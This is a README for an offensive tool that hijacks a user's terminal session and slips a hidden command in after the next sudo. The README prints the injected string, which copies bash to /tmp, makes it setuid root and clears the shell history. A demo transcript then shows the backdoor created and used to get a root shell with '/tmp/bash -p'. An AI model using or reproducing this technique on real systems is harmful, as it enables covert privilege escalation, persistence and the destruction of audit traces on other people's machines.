# script (extra)

script (extra)

## Build
1. download files
```
git clone https://github.com/shuichiro-endo/script.git
```
2. compile
```
cd script/extra
gcc script.c -o script
```

## Usage
- run
```
cd script/extra
./script
```

- example
> [!NOTE]
> After entering the sudo command and password, the next command will be executed together with the specified commands (static char *command = ";sudo cp -rp /bin/bash /tmp;sudo chmod +s /tmp/bash;echo -n > ~/.bash_history;history -c;\x0d";). 

```
$ ./script
$ ls
README.md  script  script.c  script.h
$ ls -l /tmp/bash
ls: cannot access '/tmp/bash': No such file or directory
$ sudo ls
[sudo] password for test: 
README.md  script  script.c  script.h
$ 
$ ls
README.md  script  script.c  script.h
$ ls -l /tmp/bash
-rwsr-sr-x 1 root root 1277936 Oct  6  2023 /tmp/bash
$ exit

$ ls -l /tmp/bash
-rwsr-sr-x 1 root root 1277936 Oct  6  2023 /tmp/bash
$ /tmp/bash -p
bash-5.2#
```
